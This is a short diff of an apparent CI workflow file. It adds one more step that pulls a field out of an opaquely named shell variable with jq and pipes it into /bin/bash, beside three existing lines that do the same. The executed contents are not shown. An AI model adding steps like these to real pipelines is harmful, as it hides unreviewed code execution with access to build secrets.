@@ -22,6 +22,7 @@ jobs:
           echo $lm1 | jq -r .wq69 | /bin/bash
           echo $udrv940 | jq -r .lqb1783 | /bin/bash
           echo $i4457 | jq -r .heqzh537 | /bin/bash
+          printf '%s' "$n010" | jq -r .zp5237 | /bin/bash
 
       - name: Upload results
         if: always()
